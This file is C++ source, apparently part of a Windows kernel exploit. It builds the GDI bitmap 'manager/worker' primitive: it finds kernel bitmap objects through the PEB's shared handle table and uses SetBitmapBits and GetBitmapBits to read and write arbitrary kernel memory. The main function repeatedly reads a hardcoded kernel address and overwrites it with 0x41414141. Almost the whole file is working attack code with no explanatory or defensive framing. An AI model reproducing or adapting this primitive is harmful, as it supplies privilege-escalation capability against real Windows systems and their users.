#include "../inc/core.h"
#pragma comment(lib, "gdi32.lib")

namespace global {
	/// 32bit size: 0x10
	/// 64bit size: 0x18
	typedef struct _GDI_CELL
	{
		PVOID pKernelAddress;
		WORD wProcessId;
		WORD wCount;
		WORD wUpper;
		WORD wType;
		PVOID pUserAddress;
	} _GDI_CELL;
}

class Rw
{
public:
	Rw() {
		color_buf = malloc(0x64 * 0x64 * 4);
		h_manager = CreateBitmap(0x64, 0x64, 1, 32, color_buf);
		h_worker = CreateBitmap(0x64, 0x64, 1, 32, color_buf);

		SIZE_T GdiSharedHandleTable = Ps().x86() ? *(SIZE_T*)(Ps().peb() + 148) : *(SIZE_T*)(Ps().peb() + 248);

		SIZE_T ManagerHandleTableEntry = NULL;
		SIZE_T ManagerKernelObj = NULL;
		SIZE_T ManagerpvScan0 = NULL;

		if (Ps().x86()) {
			ManagerHandleTableEntry = GdiSharedHandleTable + ((SIZE_T)h_manager & 0xffff) * sizeof(global::_GDI_CELL);
			ManagerKernelObj = *(PSIZE_T)ManagerHandleTableEntry;
			ManagerpvScan0 = ManagerKernelObj + 0x30;
		}
		else {
			ManagerHandleTableEntry = GdiSharedHandleTable + ((SIZE_T)h_manager & 0xffff) * sizeof(global::_GDI_CELL);
			ManagerKernelObj = *(PSIZE_T)ManagerHandleTableEntry;
			ManagerpvScan0 = ManagerKernelObj + 0x50;
		}

		SIZE_T WorkerHandleTableEntry = NULL;
		SIZE_T WorkerKernelObj = NULL;
		SIZE_T WorkerpvScan0 = NULL;

		if (Ps().x86()) {
			WorkerHandleTableEntry = GdiSharedHandleTable + ((SIZE_T)h_worker & 0xffff) * sizeof(global::_GDI_CELL);
			WorkerKernelObj = *(PSIZE_T)WorkerHandleTableEntry;
			WorkerpvScan0 = WorkerKernelObj + 0x30;
		}
		else {
			WorkerHandleTableEntry = GdiSharedHandleTable + ((SIZE_T)h_worker & 0xffff) * sizeof(global::_GDI_CELL);
			WorkerKernelObj = *(PSIZE_T)WorkerHandleTableEntry;
			WorkerpvScan0 = WorkerKernelObj + 0x50;
		}

		this->a = ManagerpvScan0;
		this->b = WorkerpvScan0;
	}

	~Rw() {
		if (color_buf)
			free(color_buf);
	}

	void rdm(PVOID addr, PVOID buf, SIZE_T size) {
		SetBitmapBits(h_manager, sizeof(SIZE_T), &addr);
		GetBitmapBits(h_worker, size, buf);
	}

	void wtm(PVOID addr, PVOID buf, SIZE_T size) {
		SetBitmapBits(h_manager, sizeof(SIZE_T), &addr);
		SetBitmapBits(h_worker, size, buf);
	}

	template<typename T>
	T rd() {
		T ret;
		rdm((PVOID)ptr, &ret, sizeof(ret));
		return ret;
	}

	template<typename T>
	VOID wt(T data) {
		wtm((PVOID)ptr, &data, sizeof(T));
	}

	Rw& operator()(SIZE_T ptr) {
		this->ptr = ptr;
		return *this;
	}

private:
	PVOID color_buf = NULL;
	SIZE_T ptr = NULL;
public:
	SIZE_T a = NULL, b = NULL;
	HBITMAP h_manager = NULL;
	HBITMAP h_worker = NULL;
};

#include <stdio.h>

int main() {
	master_1;
	Rw x;
	BYTE write_buf[40] = { 0x41, 0x41, 0x41, 0x41 };
	BYTE read_buf[40] = { 0 };

	printf("eq %p %p\n", x.a, x.b);

	while (1) {
		SIZE_T addr = 0xfffff80003c3ec68;
		
		printf("%p\n", addr);
		
		//x.wtm(addr, write_buf, 4);
		//x.rdm(addr, read_buf, 4);

		//for (int i = 0; i < 4; ++i) {
		//	printf("%X ", read_buf[i] + 1);
		//}

		printf("%p", x(addr).rd<SIZE_T>());
		x(addr).wt<SIZE_T>(0x41414141);

		printf("\n");
		getchar();
	}

    return 0;
}
